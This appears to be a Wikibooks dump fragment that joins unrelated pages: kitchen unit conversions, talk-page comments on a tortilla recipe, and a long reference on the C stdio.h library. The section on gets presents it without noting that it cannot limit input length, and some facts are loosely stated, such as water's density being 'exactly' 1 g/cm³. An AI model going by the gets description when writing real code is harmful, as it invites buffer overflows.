* 1 l = 10 dl = 100 cl = 1000 ml = 1 dm&lt;sup&gt;3&lt;/sup&gt; = 0.264 US gallons
* 1 kg = 10 hg = 1000 g = 2.2 pounds
* 1 cm = 0.39 inches

Some recipes in Wikibooks Cookbook use American measurement units (''pounds and ounces, Fahrenheit, fluid ounces and pints, etc.'') and some recipes use metric units (''grammes and kilograms, Celsius [not metric], milliliter, etc.'').  An attempt to ensure that all Cookbook recipes use metric units (alone or alongside American units) is an ongoing job.  A list of recipes which have been confirmed as having metric units can be found [http://en.wikibooks.org/wiki/Category:Recipes_with_metric_units here].

==Avoirdupois Conversion Reference==

===Volume===
; American units:
* 1T = 3t
* 1 cup = 16T
* 1 pint = 2 cups
* 1 qt = 2 pints
* 1 gal = 4 qts
* 1 cup = 8 fl oz
* 1 fl oz = 2 T

===Mass===
*1 lb = 16 oz
===Mass/Volume conversions===
Approximate conversions based on water density.
These conversions are useful for more than just water.  
Although other things have different densities, they are good enough
for most estimates.
*1 fl oz = 1 oz
*1 pint = 1 lb
*2 cups = 1 lb

Water has a density of exactly 1 g/cm³
*1 mL = 1 g
*1 L = 1 kg

An American stick of butter is 1/4 lb, and is divided into 8 tablespoons. So, 1 tbsp butter = 1/2 oz butter.

==Kitchen measures around the world==
[[Image:Swedish Measuring Spoon Set.jpeg|thumb|192px|right|Swedish measuring spoons]]
===Sweden===
Sweden uses the following standard set of volume measures in recipes. (In the picture, from left to right, deciliter, tablespoon, teaspoon and milliliter.) All are metric, with the tablespoon defined as exactly 15 ml and the teaspoon as exactly 5 ml.

* deciliter (dl) = 100 ml
* tablespoon (''&quot;matsked&quot;'', msk) = 15 ml
* teaspoon (''&quot;tesked&quot;'', tsk) = 5 ml
* milliliter (''&quot;kryddmått&quot;'', krm) = 1 ml

      <text xml:space="preserve">==major change==
Note the edit by 82.69.190.150 on 23 Feb 2005. I'm not sure if the recipe got any better or worse, but the method sure did change. This affects skill level, speed, and dirty dishes, along with a minor (?) change in the result.

== suggested edit ==
I think one liter of oil is too much for an omlette. I know that olive oil is good for you but the are limits...

== Olive oil ==

I'm Spanish and I've made a lot of ''tortillas de patata''. I think that a liter of olive oil is too much. 250 ml is enough. And you can reuse the olive oil, since it is used for frying the potatoes.

I aslo suggest another change. Olive oil is the only oil you can use. Otherwise the taste is going to be worse. I know that outside Spain is expensive but is worth it!</text>

      <text xml:space="preserve">Fantastic!  This book seems to be attracting lots of ideas...

...to keep the formatting readable, I think we should use separate sub-pages for the main bodies of each idea... use the front page as a table of contents with a quite bit of blurb to catch peoples' attention.  [[User:dan-aka-jack|Dan AKA Jack]] 10:00 24 Feb 2005 GMT

I'm not very good at formating so feel free to modify my ideas.

It might be a smartidea to load the book automatically with enriched text.  If a student has a question about the meaning of a word, he can click on that word and a dictionary description pops up

Was I logged in when I posted my ideas?

==Introduction==
The &lt;code&gt;stdio.h&lt;/code&gt; header declares a broad assortment of functions that perform input and output to files and devices such as the console. It was one of the earliest headers to appear in the C library. It declares more functions than any other standard header and also requires more explanation because of the complex machinery that underlies the functions.

The device-independent model of input and output has seen dramatic improvement over the years and has received little recognition for its success. FORTRAN II was touted as a machine-independent language in the 1960s, yet it was essentially impossible to move a FORTRAN program between architectures without some change. In FORTRAN II, you named the device you were talking to right in the FORTRAN statement in the middle of your FORTRAN code. So, you said &lt;code&gt;READ INPUT TAPE 5&lt;/code&gt; on a tape-oriented IBM 7090 but &lt;code&gt;READ CARD&lt;/code&gt; to read a card image on other machines. FORTRAN IV had more generic &lt;code&gt;READ&lt;/code&gt; and &lt;code&gt;WRITE&lt;/code&gt; statements, specifying a ''logical unit number'' (LUN) instead of the device name. The era of device-independent I/O had dawned.

Peripheral devices such as printers still had fairly strong notions about what they were asked to do. And then, ''peripheral interchange'' utilities were invented to handle bizarre devices. When cathode-ray tubes came onto the scene, each manufacturer of consoles solved problems such as console cursor movement in an independent manner, causing further headaches.

It was into this atmosphere that Unix was born. Ken Thompson and Dennis Ritchie, the developers of Unix, deserve credit for packing any number of bright ideas into the operating system. Their approach to device independence was one of the brightest.

The ANSI C &lt;code&gt;&lt;stdio.h&gt;&lt;/code&gt; library is based on the original Unix file I/O primitives but casts a wider net to accommodate the least-common denominator across varied systems.

==Streams==
Input and output, whether to or from physical devices such as terminals and tape drives, or whether to or from files supported on structured storage devices, are mapped into logical data streams, whose properties are more uniform than their various inputs and outputs.  Two forms of mapping are supported: text streams and binary streams.

A text stream consists of one or more lines. A line in a text stream consists of zero or more characters plus a terminating new-line character. (The only exception is that in some implementations the last line of a file does not require a terminating new-line character.) Unix adopted a standard internal format for all text streams. Each line of text is terminated by a new-line character. That's what any program expects when it reads text, and that's what any program produces when it writes text. (This is the most basic convention, and if it doesn't meet the needs of a text-oriented peripheral attached to a Unix machine, then the fix-up occurs out at the edges of the system. Nothing in between needs to change.) The string of characters that go into, or come out of a text stream may have to be modified to conform to specific conventions. This results in a possible difference between the data that go into a text stream and the data that come out. For instance, in some implementations when a space-character precedes a new-line character in the input, the space character gets removed out of the output. In general, when the data only consists of printable characters and control characters like horizontal tab and new-line, the input and output of a text stream are equal.

Compared to a text stream, a binary stream is pretty straight forward. A binary stream is an ordered sequence of characters that can transparently record internal data. Data written to a binary stream shall always equal the data that gets read out under the same implementation. Binary streams, however, may have an implementation-defined number of null characters appended to the end of the stream. There are no further conventions which need to be considered.

Nothing in Unix prevents the program from writing arbitrary 8-bit binary codes to any open file, or reading them back unchanged from an adequate repository. Thus, Unix obliterated the long-standing distinction between text streams and binary streams.

== Standard Streams ==
When a C program starts its execution the program automatically opens three standard streams named
&lt;code&gt;stdin&lt;/code&gt;, &lt;code&gt;stdout&lt;/code&gt;, and &lt;code&gt;stderr&lt;/code&gt;. These are attached for every C program.

The first standard stream is used for input buffering and the other two are used for output. These streams are sequences of bytes.

Consider the following program:

&lt;source lang=c&gt;
 /* An example program. */
 int main()
 {
     int var;
     scanf (&quot;%d&quot;, &amp;var); /* use stdin for scanning an integer from keyboard. */
     printf (&quot;%d&quot;, var); /* use stdout for printing a character. */
     return 0;
 }
 /* end program. */
&lt;/source&gt;
    
By default &lt;code&gt;stdin&lt;/code&gt; points to the keyboard and &lt;code&gt;stdout&lt;/code&gt; and &lt;code&gt;stderr&lt;/code&gt; point to the screen. It is possible under Unix and may be possible under other operating systems to redirect input from or output to a file or both.

==&lt;code&gt;FILE&lt;/code&gt; pointers==
The &lt;code&gt;&lt;stdio.h&gt;&lt;/code&gt; header contains a definition for a type &lt;code&gt;FILE&lt;/code&gt; (usually via a &lt;code&gt;typedef&lt;/code&gt;) which is capable of processing all the information needed to exercise control over a stream, including its file position indicator, a pointer to the associated buffer (if any), an error indicator that records whether a read/write error has occurred, and an end-of-file indicator that records whether the end of the file has been reached.

It is considered bad manners to access the contents of &lt;code&gt;FILE&lt;/code&gt; directly unless the programmer is writing an implementation of &lt;code&gt;&lt;stdio.h&gt;&lt;/code&gt; and its contents. Better access to the contents of &lt;code&gt;FILE&lt;/code&gt; is provided via the functions in &lt;code&gt;&lt;stdio.h&gt;&lt;/code&gt;. It can be said that the &lt;code&gt;FILE&lt;/code&gt; type is an early example of [[w:Object-oriented programming|object-oriented programming]].

==Opening and Closing Files==
To open and close files, the &lt;code&gt;&lt;stdio.h&gt;&lt;/code&gt; library has three functions: &lt;code&gt;fopen&lt;/code&gt;, &lt;code&gt;freopen&lt;/code&gt;, and &lt;code&gt;fclose&lt;/code&gt;.
===Opening Files===
&lt;source lang=c&gt;
 #include &lt;stdio.h&gt;
 FILE *fopen(const char *filename, const char *mode);
 FILE *freopen(const char *filename, const char *mode, FILE *stream);
&lt;/source&gt;

&lt;code&gt;fopen&lt;/code&gt; and &lt;code&gt;freopen&lt;/code&gt; opens the file whose name is in the string pointed to by &lt;code&gt;filename&lt;/code&gt; and associates a stream with it. Both return a pointer to the object controlling the stream, or if the open operation fails a null pointer. The error and end-of-file indicators are cleared, and if the open operation fails error is set. &lt;code&gt;freopen&lt;/code&gt; differs from &lt;code&gt;fopen&lt;/code&gt; in that the file pointed to by &lt;code&gt;stream&lt;/code&gt; is closed first when already open and any close errors are ignored.

&lt;code&gt;mode&lt;/code&gt; for both functions points to a string consisting of one of the following sequences:

 r           open a text file for reading
 w           truncate to zero length or create a text file for writing
 a           append; open or create text file for writing at end-of-file
 rb          open binary file for reading
 wb          truncate to zero length or create a binary file for writing
 ab          append; open or create binary file for writing at end-of-file
 r+          open text file for update (reading and writing)
 w+          truncate to zero length or create a text file for update
 a+          append; open or create text file for update
 r+b or rb+  open binary file for update (reading and writing)
 w+b or wb+  truncate to zero length or create a binary file for update
 a+b or ab+  append; open or create binary file for update

Opening a file with read mode ('&lt;code&gt;r&lt;/code&gt;' as the first character in the &lt;code&gt;mode&lt;/code&gt; argument) fails if the file does not exist or cannot be read.

Opening a file with append mode ('&lt;code&gt;a&lt;/code&gt;' as the first character in the &lt;code&gt;mode&lt;/code&gt; argument) causes all subsequent writes to the file to be forced to the then-current end-of-file, regardless of intervening calls to the &lt;code&gt;fseek&lt;/code&gt; function.  In some implementations, opening a binary file with append mode ('&lt;code&gt;b&lt;/code&gt;' as the second or third character in the above list of &lt;code&gt;mode&lt;/code&gt; arguments) may initially position the file position indicator for the stream beyond the last data written, because of null character padding.

When a file is opened with update mode ('&lt;code&gt;+&lt;/code&gt;' as the second or third character in the above list of &lt;code&gt;mode&lt;/code&gt; argument values), both input and output may be performed on the associated stream. However, output may not be directly followed by input without an intervening call to the &lt;code&gt;fflush&lt;/code&gt; function or to a file positioning function (&lt;code&gt;fseek&lt;/code&gt;, &lt;code&gt;fsetpos&lt;/code&gt;, or &lt;code&gt;rewind&lt;/code&gt;), and input may not be directly followed by output without an intervening call to a file positioning function, unless the input operation encounters end-of-file. Opening (or creating) a text file with update mode may instead open (or create) a binary stream in some implementations.

When opened, a stream is fully buffered if and only if it can be determined not to refer to an interactive device.

===Closing Files===
&lt;source lang=c&gt;
 #include &lt;stdio.h&gt;
 int fclose(FILE *stream);
&lt;/source&gt;

The &lt;code&gt;fclose&lt;/code&gt; function causes the stream pointed to by &lt;code&gt;stream&lt;/code&gt; to be flushed and the associated file to be closed.  Any unwritten buffered data for the stream are delivered to the host environment to be written to the file; any unread buffered data are discarded. The stream is disassociated from the file.  If the associated buffer was automatically allocated, it is deallocated.  The function returns zero if the stream was successfully closed or &lt;code&gt;EOF&lt;/code&gt; if any errors were detected.

==Other file access functions==
===The &lt;code&gt;fflush&lt;/code&gt; function===
&lt;source lang=c&gt;
 #include &lt;stdio.h&gt;
 int fflush(FILE *stream);
&lt;/source&gt;

If &lt;code&gt;stream&lt;/code&gt; points to an output stream or an update stream in which the most recent operation was not input, the &lt;code&gt;fflush&lt;/code&gt; function causes any unwritten data for that stream to be deferred to the host environment to be written to the file. The behavior of fflush is undefined for input stream.

If &lt;code&gt;stream&lt;/code&gt; is a null pointer, the &lt;code&gt;fflush&lt;/code&gt; function performs this flushing action on all streams for which the behavior is defined above.

The &lt;code&gt;fflush&lt;/code&gt; functions returns &lt;code&gt;EOF&lt;/code&gt; if a write error occurs, otherwise zero.

The reason for having a &lt;code&gt;fflush&lt;/code&gt; function is because streams in C can have buffered input/output; that is, functions that write to a file actually write to a buffer inside the &lt;code&gt;FILE&lt;/code&gt; structure.  If the buffer is filled to capacity, the write functions will call &lt;code&gt;fflush&lt;/code&gt; to actually &quot;write&quot; the data that is in the buffer to the file. Because &lt;code&gt;fflush&lt;/code&gt; is only called every once in a while, calls to the operating system to do a raw write are minimized.

===The &lt;code&gt;setbuf&lt;/code&gt; function===
&lt;source lang=c&gt;
 #include &lt;stdio.h&gt;
 void setbuf(FILE *stream, char *buf);
&lt;/source&gt;

Except that it returns no value, the &lt;code&gt;setbuf&lt;/code&gt; function is equivalent to the &lt;code&gt;setvbuf&lt;/code&gt; function invoked with the values &lt;code&gt;_IOFBF&lt;/code&gt; for &lt;code&gt;mode&lt;/code&gt; and &lt;code&gt;BUFSIZ&lt;/code&gt; for &lt;code&gt;size&lt;/code&gt;, or (if &lt;code&gt;buf&lt;/code&gt; is a null pointer) with the value &lt;code&gt;_IONBF&lt;/code&gt; for &lt;code&gt;mode&lt;/code&gt;.

===The &lt;code&gt;setvbuf&lt;/code&gt; function===
&lt;source lang=c&gt;
 #include &lt;stdio.h&gt;
 int setvbuf(FILE *stream, char *buf, int mode, size_t size);
&lt;/source&gt;

The &lt;code&gt;setvbuf&lt;/code&gt; function may be used only after the stream pointed to by &lt;code&gt;stream&lt;/code&gt; has been associated with an open file and before any other operation is performed on the stream. The argument &lt;code&gt;mode&lt;/code&gt; determines how the stream will be buffered, as follows: &lt;code&gt;_IOFBF&lt;/code&gt; causes input/output to be fully buffered; &lt;code&gt;_IOLBF&lt;/code&gt; causes input/output to be line buffered; &lt;code&gt;_IONBF&lt;/code&gt; causes input/output to be unbuffered. If &lt;code&gt;buf&lt;/code&gt; is not a null pointer, the array it points to may be used instead of a buffer associated by the &lt;code&gt;setvbuf&lt;/code&gt; function. (The buffer must have a lifetime at least as great as the open stream, so the stream should be closed before a buffer that has automatic storage duration is deallocated upon block exit.) The argument &lt;code&gt;size&lt;/code&gt; specifies the size of the array. The contents of the array at any time are indeterminate.

The &lt;code&gt;setvbuf&lt;/code&gt; function returns zero on success, or nonzero if an invalid value is given for &lt;code&gt;mode&lt;/code&gt; or if the request cannot be honored.

==Functions that Modify the File Position Indicator==
The &lt;code&gt;stdio.h&lt;/code&gt; library has five functions that affect the file position indicator besides those that do reading or writing: &lt;code&gt;fgetpos&lt;/code&gt;, &lt;code&gt;fseek&lt;/code&gt;, &lt;code&gt;fsetpos&lt;/code&gt;, &lt;code&gt;ftell&lt;/code&gt;, and &lt;code&gt;rewind&lt;/code&gt;.

The &lt;code&gt;fseek&lt;/code&gt; and &lt;code&gt;ftell&lt;/code&gt; functions are older than &lt;code&gt;fgetpos&lt;/code&gt; and &lt;code&gt;fsetpos&lt;/code&gt;.
===The &lt;code&gt;fgetpos&lt;/code&gt; and &lt;code&gt;fsetpos&lt;/code&gt; functions===
&lt;source lang=c&gt;
 #include &lt;stdio.h&gt;
 int fgetpos(FILE *stream, fpos_t *pos);
 int fsetpos(FILE *stream, const fpos_t *pos);
&lt;/source&gt;

The &lt;code&gt;fgetpos&lt;/code&gt; function stores the current value of the file position indicator for the stream pointed to by &lt;code&gt;stream&lt;/code&gt; in the object pointed to by &lt;code&gt;pos&lt;/code&gt;. The value stored contains unspecified information usable by the &lt;code&gt;fsetpos&lt;/code&gt; function for repositioning the stream to its position at the time of the call to the &lt;code&gt;fgetpos&lt;/code&gt; function.

If successful, the &lt;code&gt;fgetpos&lt;/code&gt; function returns zero; on failure, the &lt;code&gt;fgetpos&lt;/code&gt; function returns nonzero and stores an implementation-defined positive value in &lt;code&gt;errno&lt;/code&gt;.

The &lt;code&gt;fsetpos&lt;/code&gt; function sets the file position indicator for the stream pointed to by &lt;code&gt;stream&lt;/code&gt; according to the value of the object pointed to by &lt;code&gt;pos&lt;/code&gt;, which shall be a value obtained from an earlier call to the &lt;code&gt;fgetpos&lt;/code&gt; function on the same stream.

A successful call to the &lt;code&gt;fsetpos&lt;/code&gt; function clears the end-of-file indicator for the stream and undoes any effects of the &lt;code&gt;ungetc&lt;/code&gt; function on the same stream.  After an &lt;code&gt;fsetpos&lt;/code&gt; call, the next operation on an update stream may be either input or output.

If successful, the &lt;code&gt;fsetpos&lt;/code&gt; function returns zero; on failure, the &lt;code&gt;fsetpos&lt;/code&gt; function returns nonzero and stores an implementation-defined positive value in &lt;code&gt;errno&lt;/code&gt;.

===The &lt;code&gt;fseek&lt;/code&gt; and &lt;code&gt;ftell&lt;/code&gt; functions===
&lt;source lang=c&gt;
 #include &lt;stdio.h&gt;
 int fseek(FILE *stream, long int offset, int whence);
 long int ftell(FILE *stream);
&lt;/source&gt;

The &lt;code&gt;fseek&lt;/code&gt; function sets the file position indicator for the stream pointed to by &lt;code&gt;stream&lt;/code&gt;.

For a binary stream, the new position, measured in characters from the beginning of the file, is obtained by adding &lt;code&gt;offset&lt;/code&gt; to the position specified by &lt;code&gt;whence&lt;/code&gt;.  Three macros in &lt;code&gt;stdio.h&lt;/code&gt; called &lt;code&gt;SEEK_SET&lt;/code&gt;, &lt;code&gt;SEEK_CUR&lt;/code&gt;, and &lt;code&gt;SEEK_END&lt;/code&gt; expand to unique values. If the position specified by &lt;code&gt;whence&lt;/code&gt; is &lt;code&gt;SEEK_SET&lt;/code&gt;, the specified position is the beginning of the file; if &lt;code&gt;whence&lt;/code&gt; is &lt;code&gt;SEEK_END&lt;/code&gt;, the specified position is the end of the file; and if &lt;code&gt;whence&lt;/code&gt; is &lt;code&gt;SEEK_CUR&lt;/code&gt;, the specified position is the current file position. A binary stream need not meaningfully support &lt;code&gt;fseek&lt;/code&gt; calls with a &lt;code&gt;whence&lt;/code&gt; value of &lt;code&gt;SEEK_END&lt;/code&gt;.

For a text stream, either &lt;code&gt;offset&lt;/code&gt; shall be zero, or &lt;code&gt;offset&lt;/code&gt; shall be a value returned by an earlier call to the &lt;code&gt;ftell&lt;/code&gt; function on the same stream and &lt;code&gt;whence&lt;/code&gt; shall be &lt;code&gt;SEEK_SET&lt;/code&gt;.

The &lt;code&gt;fseek&lt;/code&gt; function returns nonzero only for a request that cannot be satisfied.

The &lt;code&gt;ftell&lt;/code&gt; function obtains the current value of the file position indicator for the stream pointed to by &lt;code&gt;stream&lt;/code&gt;.  For a binary stream, the value is the number of characters from the beginning of the file; for a text stream, its file position indicator contains unspecified information, usable by the &lt;code&gt;fseek&lt;/code&gt; function for returning the file position indicator for the stream to its position at the time of the &lt;code&gt;ftell&lt;/code&gt; call; the difference between two such return values is not necessarily a meaningful measure of the number of characters written or read.

If successful, the &lt;code&gt;ftell&lt;/code&gt; function returns the current value of the file position indicator for the stream. On failure, the &lt;code&gt;ftell&lt;/code&gt; function returns &lt;code&gt;-1L&lt;/code&gt; and stores an implementation-defined positive value in &lt;code&gt;errno&lt;/code&gt;.
===The &lt;code&gt;rewind&lt;/code&gt; function===
&lt;source lang=c&gt;
 #include &lt;stdio.h&gt;
 void rewind(FILE *stream);
&lt;/source&gt;

The &lt;code&gt;rewind&lt;/code&gt; function sets the file position indicator for the stream pointed to by &lt;code&gt;stream&lt;/code&gt; to the beginning of the file.  It is equivalent to

 (void)fseek(stream, 0L, SEEK_SET)

except that the error indicator for the stream is also cleared. 
==Error Handling Functions==
===The &lt;code&gt;clearerr&lt;/code&gt; function===
&lt;source lang=c&gt;
 #include &lt;stdio.h&gt;
 void clearerr(FILE *stream);
&lt;/source&gt;

The &lt;code&gt;clearerr&lt;/code&gt; function clears the end-of-file and error indicators for the stream pointed to by &lt;code&gt;stream&lt;/code&gt;.
===The &lt;code&gt;feof&lt;/code&gt; function===
&lt;source lang=c&gt;
 #include &lt;stdio.h&gt;
 int feof(FILE *stream);
&lt;/source&gt;

The &lt;code&gt;feof&lt;/code&gt; function tests the end-of-file indicator for the stream pointed to by &lt;code&gt;stream&lt;/code&gt; and returns nonzero if and only if the end-of-file indicator is set for &lt;code&gt;stream&lt;/code&gt;, otherwise it returns zero.

===The &lt;code&gt;ferror&lt;/code&gt; function===
&lt;source lang=c&gt;
 #include &lt;stdio.h&gt;
 int ferror(FILE *stream);
&lt;/source&gt;

The &lt;code&gt;ferror&lt;/code&gt; function tests the error indicator for the stream pointed to by &lt;code&gt;stream&lt;/code&gt; and returns nonzero if and only if the error indicator is set for &lt;code&gt;stream&lt;/code&gt;, otherwise it returns zero.
===The &lt;code&gt;perror&lt;/code&gt; function===
&lt;source lang=c&gt;
 #include &lt;stdio.h&gt;
 void perror(const char *s);
&lt;/source&gt;

The &lt;code&gt;perror&lt;/code&gt; function maps the error number in the integer expression &lt;code&gt;errno&lt;/code&gt; to an error message. It writes a sequence of characters to the standard error stream thus: first, if &lt;code&gt;s&lt;/code&gt; is not a null pointer and the character pointed to by &lt;code&gt;s&lt;/code&gt; is not the null character, the string pointed to by &lt;code&gt;s&lt;/code&gt; followed by a colon (&lt;tt&gt;:&lt;/tt&gt;) and a space; then an appropriate error message string followed by a new-line character. The contents of the error message are the same as those returned by the &lt;code&gt;strerror&lt;/code&gt; function with the argument &lt;code&gt;errno&lt;/code&gt;, which are implementation-defined.

==Other Operations on Files==
The &lt;code&gt;stdio.h&lt;/code&gt; library has a variety of functions that do some operation on files besides reading and writing.

===The &lt;code&gt;remove&lt;/code&gt; function===
&lt;source lang=c&gt;
 #include &lt;stdio.h&gt;
 int remove(const char *filename);
&lt;/source&gt;

The &lt;code&gt;remove&lt;/code&gt; function causes the file whose name is the string pointed to by &lt;code&gt;filename&lt;/code&gt; to be no longer accessible by that name.  A subsequent attempt to open that file using that name will fail, unless it is created anew.  If the file is open, the behavior of the &lt;code&gt;remove&lt;/code&gt; function is implementation-defined.

The &lt;code&gt;remove&lt;/code&gt; function returns zero if the operation succeeds, nonzero if it fails.

===The &lt;code&gt;rename&lt;/code&gt; function===
&lt;source lang=c&gt;
 #include &lt;stdio.h&gt;
 int rename(const char *old_filename, const char *new_filename);
&lt;/source&gt;

The &lt;code&gt;rename&lt;/code&gt; function causes the file whose name is the string pointed to by &lt;code&gt;old_filename&lt;/code&gt; to be henceforth known by the name given by the string pointed to by &lt;code&gt;new_filename&lt;/code&gt;.  The file named &lt;code&gt;old_filename&lt;/code&gt; is no longer accessible by that name.  If a file named by the string pointed to by &lt;code&gt;new_filename&lt;/code&gt; exists prior to the call to the &lt;code&gt;rename&lt;/code&gt; function, the behavior is implementation-defined.

The &lt;code&gt;rename&lt;/code&gt; function returns zero if the operation succeeds, nonzero if it fails, in which case if the file existed previously it is still known by its original name.

===The &lt;code&gt;tmpfile&lt;/code&gt; function===
&lt;source lang=c&gt;
 #include &lt;stdio.h&gt;
 FILE *tmpfile(void);
&lt;/source&gt;

The &lt;code&gt;tmpfile&lt;/code&gt; function creates a temporary binary file that will automatically be removed when it is closed or at program termination.  If the program terminates abnormally, whether an open temporary file is removed is implementation-defined.  The file is opened for update with &lt;code&gt;&quot;wb+&quot;&lt;/code&gt; mode.

The &lt;code&gt;tmpfile&lt;/code&gt; function returns a pointer to the stream of the file that it created.  If the file cannot be created, the &lt;code&gt;tmpfile&lt;/code&gt; function returns a null pointer.

===The &lt;code&gt;tmpnam&lt;/code&gt; function===
&lt;source lang=c&gt;
 #include &lt;stdio.h&gt;
 char *tmpnam(char *s);
&lt;/source&gt;

The &lt;code&gt;tmpnam&lt;/code&gt; function generates a string that is a valid file name and that is not the name of an existing file.

The &lt;code&gt;tmpnam&lt;/code&gt; function generates a different string each time it is called, up to &lt;code&gt;TMP_MAX&lt;/code&gt; times. (&lt;code&gt;TMP_MAX&lt;/code&gt; is a macro defined in &lt;code&gt;stdio.h&lt;/code&gt;.) If it is called more than &lt;code&gt;TMP_MAX&lt;/code&gt; times, the behavior is implementation-defined.

The implementation shall behave as if no library function calls the &lt;code&gt;tmpnam&lt;/code&gt; function.

If the argument is a null pointer, the &lt;code&gt;tmpnam&lt;/code&gt; function leaves its result in an internal static object and returns a pointer to that object.  Subsequent calls to the &lt;code&gt;tmpnam&lt;/code&gt; function may modify the same object. If the argument is not a null pointer, it is assumed to point to an array of at least &lt;code&gt;L_tmpnam&lt;/code&gt; characters (&lt;code&gt;L_tmpnam&lt;/code&gt; is another macro in &lt;code&gt;stdio.h&lt;/code&gt;); the &lt;code&gt;tmpnam&lt;/code&gt; function writes its result in that array and returns the argument as its value.

The value of the macro &lt;code&gt;TMP_MAX&lt;/code&gt; must be at least 25.
 
==Reading from Files==
===Character Input Functions===
====The &lt;code&gt;fgetc&lt;/code&gt; function====
&lt;source lang=c&gt;
 #include &lt;stdio.h&gt;
 int fgetc(FILE *stream);
&lt;/source&gt;

The &lt;code&gt;fgetc&lt;/code&gt; function obtains the next character (if present) as an &lt;code&gt;unsigned char&lt;/code&gt; converted to an &lt;code&gt;int&lt;/code&gt;, from the input stream pointed to by &lt;code&gt;stream&lt;/code&gt;, and advances the associated file position indicator for the stream (if defined). 

The &lt;code&gt;fgetc&lt;/code&gt; function returns the next character from the input stream pointed to by &lt;code&gt;stream&lt;/code&gt;. If the stream is at end-of-file, the end-of-file indicator for the stream is set and &lt;code&gt;fgetc&lt;/code&gt; returns &lt;code&gt;EOF&lt;/code&gt; (&lt;code&gt;EOF&lt;/code&gt; is a negative value defined in &lt;code&gt;&lt;stdio.h&gt;&lt;/code&gt;, usually &lt;code&gt;(-1)&lt;/code&gt;). If a read error occurs, the error indicator for the stream is set and &lt;code&gt;fgetc&lt;/code&gt; returns &lt;code&gt;EOF&lt;/code&gt;.

====The &lt;code&gt;fgets&lt;/code&gt; function====
 #include &lt;stdio.h&gt;
 char *fgets(char *s, int n, FILE *stream);

The &lt;code&gt;fgets&lt;/code&gt; function reads at most one less than the number of characters specified by &lt;code&gt;n&lt;/code&gt; from the stream pointed to by &lt;code&gt;stream&lt;/code&gt; into the array pointed to by &lt;code&gt;s&lt;/code&gt;. No additional characters are read after a new-line character (which is retained) or after end-of-file. A null character is written immediately after the last character read into the array.

The &lt;code&gt;fgets&lt;/code&gt; function returns &lt;code&gt;s&lt;/code&gt; if successful. If end-of-file is encountered and no characters have been read into the array, the contents of the array remain unchanged and a null pointer is returned. If a read error occurs during the operation, the array contents are indeterminate and a null pointer is returned.

Warning: Different operating systems may use different character sequences to represent the end-of-line sequence. For example, some filesystems use the terminator &lt;code&gt;\r\n&lt;/code&gt; in text files; &lt;code&gt;fgets&lt;/code&gt; may read those lines, removing the &lt;code&gt;\n&lt;/code&gt; but keeping the &lt;code&gt;\r&lt;/code&gt; as the last character of &lt;code&gt;s&lt;/code&gt;. This expurious character should be removed in the string &lt;code&gt;s&lt;/code&gt; before the string is used for anything (unless the programmer doesn't care about it). Unixes typically use &lt;code&gt;\n&lt;/code&gt; as its end-of-line sequence, MS-DOS and Windows uses &lt;code&gt;\r\n&lt;/code&gt;, and Mac OSes used &lt;code&gt;\r&lt;/code&gt; before OS X.

&lt;source lang=c&gt;
 /* A example program that reads from stdin and writes to stdout */
 #include &lt;stdio.h&gt;

 #define BUFFER_SIZE 100

 int main(void)
 {
     char buffer[BUFFER_SIZE]; /* a read buffer */
     while( fgets (buffer, BUFFER_SIZE, stdin) != NULL)
     {
          printf(&quot;%s&quot;,buffer);
     }
     return 0;
 }
 /* end program. */
&lt;/source&gt;

====The &lt;code&gt;getc&lt;/code&gt; function====
 #include &lt;stdio.h&gt;
 int getc(FILE *stream);

The &lt;code&gt;getc&lt;/code&gt; function is equivalent to &lt;code&gt;fgetc&lt;/code&gt;, except that it may be implemented as a macro. If it is implemented as a macro, the &lt;code&gt;stream&lt;/code&gt; argument may be evaluated more than once, so the argument should never be an expression with side effects (i.e. have an assignment, increment, or decrement operators, or be a function call).

The &lt;code&gt;getc&lt;/code&gt; function returns the next character from the input stream pointed to by &lt;code&gt;stream&lt;/code&gt;. If the stream is at end-of-file, the end-of-file indicator for the stream is set and &lt;code&gt;getc&lt;/code&gt; returns &lt;code&gt;EOF&lt;/code&gt; (&lt;code&gt;EOF&lt;/code&gt; is a negative value defined in &lt;code&gt;&lt;stdio.h&gt;&lt;/code&gt;, usually &lt;code&gt;(-1)&lt;/code&gt;). If a read error occurs, the error indicator for the stream is set and &lt;code&gt;getc&lt;/code&gt; returns &lt;code&gt;EOF&lt;/code&gt;.

====The &lt;code&gt;getchar&lt;/code&gt; function====
 #include &lt;stdio.h&gt;
 int getchar(void);

The &lt;code&gt;getchar&lt;/code&gt; function is equivalent to &lt;code&gt;getc&lt;/code&gt; with the argument &lt;code&gt;stdin&lt;/code&gt;.

The &lt;code&gt;getchar&lt;/code&gt; function returns the next character from the input stream pointed to by &lt;code&gt;stdin&lt;/code&gt;. If &lt;code&gt;stdin&lt;/code&gt; is at end-of-file, the end-of-file indicator for &lt;code&gt;stdin&lt;/code&gt; is set and &lt;code&gt;getchar&lt;/code&gt; returns &lt;code&gt;EOF&lt;/code&gt; (&lt;code&gt;EOF&lt;/code&gt; is a negative value defined in &lt;code&gt;&lt;stdio.h&gt;&lt;/code&gt;, usually &lt;code&gt;(-1)&lt;/code&gt;). If a read error occurs, the error indicator for &lt;code&gt;stdin&lt;/code&gt; is set and &lt;code&gt;getchar&lt;/code&gt; returns &lt;code&gt;EOF&lt;/code&gt;.

====The &lt;code&gt;gets&lt;/code&gt; function====
 #include &lt;stdio.h&gt;
 char *gets(char *s);

The &lt;code&gt;gets&lt;/code&gt; function reads characters from the input stream pointed to by &lt;code&gt;stdin&lt;/code&gt; into the array pointed to by &lt;code&gt;s&lt;/code&gt; until an end-of-file is encountered or a new-line character is read. Any new-line character is discarded, and a null character is written immediately after the last character read into the array.

The &lt;code&gt;gets&lt;/code&gt; function returns &lt;code&gt;s&lt;/code&gt; if successful. If the end-of-file is encountered and no characters have been read into the array, the contents of the array remain unchanged and a null pointer is returned. If a read error occurs during the operation, the array contents are indeterminate and a null pointer is returned.

